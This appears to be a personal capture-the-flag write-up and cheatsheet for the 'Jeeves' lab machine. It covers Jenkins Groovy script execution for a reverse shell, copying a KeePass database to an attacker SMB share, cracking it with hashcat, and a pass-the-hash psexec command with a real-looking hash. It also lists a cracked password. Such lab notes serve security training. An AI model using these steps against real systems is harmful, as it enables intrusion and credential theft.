# Jeeves \[Medium]

## Report

An HTTP site at port 5000 hosts a Jenkins user panel wehre we are able to execute groovy script in the Scripts section or by creating a new project and running a Windows script.

Getting a reverse shell as kohsuke, user has 'SeImpersonate' privelege enabled so using JuicyPotato would get us root which is the unintended path.

FInd a keepass database in the Documents folder, crack it using john and hashcat and retrieve a hash that can be passed for psexec to become admin. The root file is in an ADS so use `/R` to list it out

## Cheatsheet

```
String result = "whoami".execute().text 
println result
#Groovy revshell to execute cmd.exe

sudo python3 /opt/impacket/examples/smbserver.py hi pwd -smb2support 
net view \10.10.14.3\
#Next command didnt do much tho
powershell -c "New-PSDrive -Name 'hello' -PSProvider 'FileSystem' -Root '\10.10.14.3\hi'" [Did this do anything tho]

copy .\CEH.kdbx \10.10.14.3\hi 
PowerShell: Copy-Item C:\Users\bob\Desktop<LOOT> \<share><LOOT>

keepass2john CEH.kdbx
hashcat64.exe -m 13400 hash.txt rockyou.txt -d 1
kpcli -kdb CEH.kdbx ls --group CEH --entries 
show -f [entry_number]
sudo python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe 
dir /R 
more < hm.txt:root.txt
```

## Loot

### Creds

CEH:moonshine1 \[keepass master password]

### Enumeration

**SMB** \
Nonauth session denied

**80** \
error.html is just ss but some good info \
MSSQL 2005; .NET version 2.05 \
This thing doesn't even forward our data it just redirects to error.html fuzzed this also didnt get much, file extensions maybe?

**50000 \[HTTP]**\
Powered by Jetty:// 9.4.z-SNAPSHOT \
CVE 2021-28164 : Information disclouse by URL encoding . -> %2e \
We cant find any files by fuzzing tho, a specific wordlist also didnt help \
HOW TF COULD YOU NOT LET FFUF FINISH YOU TOOL \
/askjeeves (302) \
http://10.10.10.63:50000/askjeeves \
Jenkins 2.87 running

/script allows us to execute groovy scripts

groovy revshell execute cmd.exe, powershell seems to not work

IEX nishang tcp shell otherwise (more professional i feel)

#### Kohsuke

User kohsuke SeImpersonate autologon creds for user ben unattend - creds for user ben C:\Windows\Panther\Unattend.xml

Find keepas db in Documents
